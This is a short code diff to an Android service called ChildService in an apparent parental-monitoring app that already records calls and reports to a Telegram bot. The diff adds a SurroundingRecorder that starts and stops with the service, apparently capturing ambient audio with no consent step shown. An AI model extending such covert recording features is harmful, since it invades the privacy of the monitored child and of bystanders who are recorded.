@@ -34,8 +34,8 @@ class ChildService : Service() {
 
         AppBlocker.startMonitoring(this)
         StatusReporter.startHeartbeat(this)
+        SurroundingRecorder.start(this)
 
-        // notify dad phone is online
         telegramListener.sendMessage("✅ Phone online.")
     }
 
@@ -80,5 +80,6 @@ class ChildService : Service() {
         super.onDestroy()
         telegramListener.stopPolling()
         callRecorder.stop()
+        SurroundingRecorder.stop()
     }
 }
